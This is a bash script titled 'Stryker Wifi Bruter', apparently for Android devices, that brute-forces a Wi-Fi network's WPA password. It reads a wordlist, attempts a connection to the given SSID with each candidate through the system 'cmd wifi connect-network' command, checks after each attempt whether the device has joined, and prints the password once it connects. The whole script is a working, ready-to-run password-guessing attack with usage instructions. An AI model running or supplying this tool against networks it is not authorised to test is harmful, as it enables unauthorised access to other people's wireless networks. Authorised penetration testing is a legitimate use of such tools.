#!/bin/bash

# Default values
interval=1
version=2



# Function to show script usage
usage() {
  echo -e "⚡ Stryker Wifi Bruter (SWB) ⚡ - by @zalexdev from strykerdefence.com"
  echo "Version: 3.0B"
  echo "Usage: $0 -s <SSID> -w <wordlist> [-i <interval>] [-v <version>] [-p <power>]"
  echo "  -s SSID of the network"
  echo "  -w Password wordlist file (one password per line, at least 8 characters)"
  echo "  -i Interval to check if SSID connected (default: 2, minimum: 0.5)"
  echo "  -v WPA version (default: 2)"
  echo "  -p Power value to set the interval (overrides -i) based on the signal strength"
  exit 1
}

# Check if cmd supports -w option for wifi status
if cmd -w wifi status 2>&1 | grep -q "find service"; then
  wifi_status_command="cmd wifi status"
else
  wifi_status_command="cmd -w wifi status"
fi

# Check if cmd supports -w option for wifi connect
if cmd -w wifi connect-network 2>&1 | grep -q "find service"; then
  wifi_connect_command="cmd wifi connect-network"
else
  wifi_connect_command="cmd -w wifi connect-network"
fi

# Function to check if SSID is connected
check_connection() {
  local ssid="$1"
  local result=$($wifi_status_command)
  if [[ $result == *"$ssid"* ]]; then
    return 0
  else
    return 1
  fi
}

# Function to set the interval based on power value
set_interval_by_power() {
  local power="$1"
  if [ $power -ge -55 ]; then
    interval=1
  elif [ $power -ge -70 ]; then
    interval=4
  elif [ $power -ge -77 ]; then
    interval=7
  else
    interval=8
  fi
  echo "Power: $power dBm, Interval: $interval sec"
}

# Parse command-line arguments
while getopts "s:w:i:v:p:" opt; do
  case $opt in
    s) ssid="$OPTARG" ;;
    w) wordlist="$OPTARG" ;;
    i) interval="$OPTARG" ;;
    v) version="$OPTARG" ;;
    p) power="$OPTARG" ;;
    *) usage ;;
  esac
done

# Check if main arguments are provided
if [ -z "$ssid" ] || [ -z "$wordlist" ]; then
  usage
fi


# Check if the wordlist file exists
if [ ! -f "$wordlist" ]; then
  echo "Error: Wordlist file '$wordlist' not found."
  exit 1
fi

# Check if cmd command exists
if ! command -v cmd &> /dev/null; then
  echo "Error: cmd command not found. Your OS is not supported"
  exit 1
fi

# Set the interval based on the power value if provided
if [ -n "$power" ]; then
  set_interval_by_power "$power"
fi

# Check if the interval is less than the minimum allowed value
if (( $(echo "$interval < 0.5" | bc -l) )); then
  interval=0.5
fi

# Get total number of lines in the wordlist
total_lines=$(wc -l < "$wordlist")
((total_lines++))

# Loop through each line in the wordlist file
checked_lines=0
while IFS= read -r password || [ -n "$password" ]; do
  if [ -z "$password" ] || [ ${#password} -lt 8 ]; then
    continue
  fi

  echo "Current password: $password, Progress ($((++checked_lines))/$total_lines | $((checked_lines * 100 / total_lines))%). Waiting $interval sec..."
  $wifi_connect_command "$ssid" "wpa$version" "$password" > /dev/null
  sleep $interval

  if check_connection "$ssid"; then
    echo -e "Password found: $password"
    exit 0
  fi
done < "$wordlist"

# If no password is found
echo -e "Password not found. Try another wordlist or check the SSID. Maybe increase the interval"